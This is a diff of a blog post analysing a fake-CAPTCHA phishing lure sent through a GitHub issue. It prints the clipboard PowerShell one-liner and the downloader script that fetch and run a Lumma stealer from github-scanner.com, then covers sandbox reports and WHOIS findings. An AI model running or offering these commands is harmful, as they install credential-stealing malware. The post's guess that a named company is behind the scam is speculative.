@@ -5,59 +5,52 @@ authors: [hirusha]
 tags: [security,scam]
 ---
 
-THIS IS INCOMPLETE AND POSSIBLY INACCURATE. DONT DRAWY ANY CONCLUSIONS FROM THIS. I WILL GET TL THIS LATER.
+Today, I received an email claiming that a security vulnerability had been detected in one of my GitHub repositories. Typically, I receive security notifications from Dependabot, which direct me back to GitHub for further action.
 
-Todo: ill just add the screenshots for now. i write the article later either on this saturday and sunday or after my exams are over.
-
-<!--truncate-->
-
-Today, i recieved an email that says theres a security vulnerability detected in one of my github repository. Normally, i recieve emails from depandabot every now and then, but it links me back to github for further action.
-
-But this email, asks me to vist github-scanner.com, and is slightly unusual, as its an issue opened in this repository, that says to go to this unkown link to get more information on how to fix this issue.
+However, this email was unusual. It prompted me to visit an external site, github-scanner.com, rather than linking to GitHub. The email was tied to an issue opened in my repository, urging me to visit this unknown link for more information on how to resolve the issue.
 
 ![alt text](image.png)
 
-As expected, github identified it as fradulent / malicious and has deleted that issue from my repository quickly from github.com
+<!--truncate-->
+
+Fortunately, GitHub quickly identified the issue as fraudulent and removed it from my repository.
 
 ![alt text](image-1.png)
 
-But, i still have the content of that malicious issue opened in my emails. So, i clicked on this link.
+However, I still had the content of the malicious issue in my email. Out of curiosity, I clicked on the link provided.
 
-It asked to me verify if i'm not a robot. you might encounter something similar when using VPNs to access certian websites. 
-
-But this looks completely different than what services like cloudflare, and yes, it's custom written.
+The website asked me to verify that I wasn't a robot. While this process is common when accessing certain websites via VPN, the human verification on this site seemed off—completely custom-built and not at all like the standard verifications by services such as Cloudflare.
 
 ![alt text](image-2.png)
 
-After you click to verify, a text (a powershell command) will be copied to your clipboard by the website. And it will ask you to open `Run` -> `CTRL+V` to paste -> `Enter` to run that command.
+After clicking the verification button, a text snippet (a PowerShell command) was automatically copied to my clipboard. The website then instructed me to paste and run the command using the `Run` dialog.
 
-This is not how human verification works. Its done using an image or a sound clip most of the time.
+This is highly suspicious since legitimate human verification methods typically involve solving a CAPTCHA or recognizing images or audio.
 
 ![alt text](image-3.png)
 
-This is what's being copied to the clipboard. 
+Here’s the PowerShell command that was copied to my clipboard:
 
 ```
 powershell.exe -w hidden -Command "iex (iwr 'https://github-scanner.com/download.txt').Content" # "✅ ''I am not a robot - reCAPTCHA Verification ID: 93752"
 ```
 
-Lets break it down.
+Breaking Down the Command
 
-- `powershell.exe -w hidden` will run the powershell script in hidden mode, so, no console will be visible to the user.
+- `powershell.exe -w hidden` runs PowerShell in hidden mode, meaning no console window is visible to the user.
+- `-Command "iex (iwr 'https://github-scanner.com/download.txt').Content"` fetches content from `https://github-scanner.com/download.txt` and executes it immediately.
+    - `iex` (short for `Invoke-Expression`) executes a string as a command.
+    - `iwr` (short for `Invoke-WebRequest`) sends a request to the specified URL.
+    - `.Content` extracts the contents of the web request.
+- The comment `# "✅ ''I am not a robot - reCAPTCHA Verification ID: 93752"` is there to mislead the user, implying the text is harmless and related to the verification process.
 
-- `-Command "iex (iwr 'https://github-scanner.com/download.txt').Content"` will fetch the content available at: `https://github-scanner.com/download.txt` and will execute it immediately, in the background.
-    - `iex` short for `Invoke-Expression` will execute a string as it was a command
-    - `iwr` short for `Invoke-WebRequest` will send a web request to this: `https://github-scanner.com/download.txt` url
-    - `.Content` will extract the contents returned from that web request.
-- `# "✅ ''I am not a robot - reCAPTCHA Verification ID: 93752"` is just a a comment, so it doesnt affect he command's functionality. It's sole purpose is to trick the user into thinking that nothing suspicious is running and what we paste is related to the human verification process.
-
-This is what it will look like after it gets pasted to the Run box
+This is what the command looks like when pasted into the Run dialog:
 
 ![alt text](image-25.png)
 
-Lets see what this command fetches and executes.
+Analyzing the Downloaded Script
 
-And `https://github-scanner.com/download.txt` contains a powershell script
+The URL `https://github-scanner.com/download.txt` contains the following PowerShell script:
 
 ```ps1
 $WebClient = New-Object System.Net.Webclient
@@ -69,65 +62,69 @@ Start-Process -FilePath $env:TEMP\SysSetup.exe
 
 Let's break it down:
 
-- `$WebClient = New-Object System.Net.Webclient` will create a new instance of the `WebClient` class , which allows you to download files from the web.
-- `$url1 = "https://github-scanner.com/l6E.exe"`sets the url of the file that will be downloaded. Its a file called `l6E.exe` hosted in `github-scanner.com`
-- `$filePath1 = "$env:TEMP\SysSetup.exe"` will be the place where this downloaded file will be saved to. Note that it uses the name `SysSetup.exe` to make it look less suspicous to the end user, if he ever notices in taskmgr
-- `$webClient.DownloadFile($url1, $filePath1)` will download this file stored in `$url1` and store it to `$filePath1`
-- `Start-Process -FilePath $env:TEMP\SysSetup.exe` will run this saved file. 
+- `$WebClient = New-Object System.Net.Webclient` creates an instance of the `WebClient` class, which is used to download files.
+- `$url1 = "https://github-scanner.com/l6E.exe"`specifies the URL of the file to be downloaded.
+- `$filePath1 = "$env:TEMP\SysSetup.exe"` defines where the file will be saved (in the temp folder, under the name SysSetup.exe to appear legitimate).
+- `$webClient.DownloadFile($url1, $filePath1)` downloads the file and stores it in the specified location.
+- `Start-Process -FilePath $env:TEMP\SysSetup.exe` runs the downloaded file.
 
 ![alt text](image-4.png)
 
-Via static analysis through Virus Total, looks like only 12 engines has detected this. Its seems to be a fairly common stealer, but only 12 engined detected it. Maybe it has to do something with the way its packet. I'm not exactly sure. [Click here](https://www.virustotal.com/gui/url/b64a25fef85ad988dee3ds3b772ea60dc4d53333cd0857924745c000ff858c5eb) to open the report.
+
+Static Analysis with VirusTotal
+
+Running a static analysis through VirusTotal shows that only 12 antivirus engines detected this file as malicious. It appears to be a common stealer, but the low detection rate suggests it might be packed in a way that evades many detection systems. You can view the report [here](https://www.virustotal.com/gui/url/b64a25fef85ad988dee3ds3b772ea60dc4d53333cd0857924745c000ff858c5eb).
 
 ![alt text](image-14.png)
 
-
-Looks like there's already a comment made on Virus Total, and looks like he got to this via the same way as it did. 
+Interestingly, there’s already a comment on VirusTotal from someone who encountered the scam through a similar method.
 
 ![alt text](image-15.png)
 
-Lets run this sample through any.run for some dynamic analysis. [Click here](https://app.any.run/tasks/8ac63e3e-621c-4d47-b832-73dad43c208c
-) to open the report.
+
+Dynamic Analysis with Any.Run
+
+I ran the sample through Any.Run for dynamic analysis. You can view the report [here](https://app.any.run/tasks/8ac63e3e-621c-4d47-b832-73dad43c208c).
 
 ![alt text](image-5.png)
 
-We can see that it makes connections to many unknown hosts. Maybe they do it for redundancy in their end, incase if one IP or a domain gets taken down, they will still recieve the data from another IP or a domain.
+The stealer connects to several unknown hosts, likely for redundancy. If one IP or domain gets taken down, the stealer can still communicate with others.
 
-We can also see that Suricata (an open source intrusion detection system) has identified this to `LUMMA Stealer`
-
+Suricata, an open-source intrusion detection system, has identified this as the "LUMMA Stealer."
 
 ![alt text](image-7.png)
 
 
 ![alt text](image-6.png)    
 
-Putting it for further dynamic analysis through tria.ge. We can confirm stuff furthermore. [Click here](https://tria.ge/240919-fczkva1gja/behavioral1) to open the report.
 
-We can also see that this malicious program does Browser Information Discovery, followed by some other discovery techniques.
+Further Dynamic Analysis with Triage
+
+I submitted the sample for further analysis using Triage. You can view the full report [here](https://tria.ge/240919-fczkva1gja/behavioral1).
+
+The stealer performs several discovery techniques, including browser information discovery, and tries to contact multiple domains.
 
 ![alt text](image-9.png)
 
-We can see that the stealer tries to contact several domains. There is also a GET request made to a steam profile - no idea where that came from.
+
+Investigating the IP Address
+
+I looked up the IP address hosting the web server, which provided information about the hosting provider and an email address to report abuse.
 
 ![alt text](image-8.png)
 
 ![alt text](image-10.png)
 
-Let's take a look at this IP address where this web server is hosted it.
-
 ![alt text](image-11.png)
-
-When we look that IP up, we can find information about its provider and also the provider's email address which we can report abuse to. 
-
-![alt text](image-13.png)
 
 ![alt text](image-12.png)
 
-I did report them via email.
 
-I also got the WHOIS report on this domain.
+WHOIS Lookup of the Domain
 
-```
+Here’s the WHOIS information for `github-scanner.com`:
+
+```yaml
    Domain Name: GITHUB-SCANNER.COM
    Registry Domain ID: 2917879423_DOMAIN_COM-VRSN
    Registrar WHOIS Server: whois.webnic.cc
@@ -216,8 +213,7 @@ circumstances will you use this Data to:
 ...
 ```
 
-Information in the WHOIS lookup is just the contact information for the company that owns the registrar.
-WebNic (The Registrar) seems to be owned by https://www.qinetics.net/.
+This domain is registered through WebNic. The WHOIS report shows that the registrant information is protected, and the registrar is based in Malaysia.
 
 ```
 Admin Street: L4-E-2, Level 4, Enterprise 4, Technology Park Malaysia, Bukit Jalil
@@ -228,25 +224,23 @@ Admin Country: Malaysia
 Admin Phone: +60.389966788
 ```
 
-And, googling this phone number leads you to many scams that has been reported previously by a large number of people over a long time span.
+Googling the registrar's phone number reveals multiple scam reports associated with domains registered through this company.
 
 ![alt text](image-16.png)
 
-Googling the address will show you these results:
+Googling the address yields results that suggest multiple businesses operate from the same location. 
 
-Which looks like several bussinesses using the same address? Or they might be in the same building, but the "L4-E-2, Level 4, Enterprise 4" makes me think its the extract address of their office inside that building.
-
-Note how inconsistent the addresses are for each company name.
+It’s possible they all share the building, but the specific mention of “L4-E-2, Level 4, Enterprise 4” suggests this could be the exact office within the building. What’s particularly notable is the inconsistency of the addresses listed for each company, raising suspicions.
 
 ![alt text](image-26.png)
 
-Most probably, "Qinetics Solutions Sdn Bhd" might be a legitamata company and Qnity might be the scammers, with a name close enough to a legitate bussiness, nearby.
+It’s likely that "Qinetics Solutions Sdn Bhd" is a legitimate company, while "Qnity" might be the scammer, using a name that closely resembles a legitimate business in the vicinity.
 
-These google reviews in this relatively small company also proves the fact that more people has encountered scams via domains provided by this registrar. 
+The Google reviews for this relatively small company further corroborate this, as more people have reported scams involving domains registered through this registrar.
 
 ![alt text](image-19.png)
 
-There are two conclusions which we can draw.
+There are two possible conclusions:
 
-It's either a legitamate company providing legitamate services, which are being heavily abused by scammers or an illegitimate company that scams people.
-
+1. This is a legitimate company providing legitimate services, but scammers are heavily abusing its platform.
+2. This is an illegitimate company that’s facilitating or directly involved in scamming people.
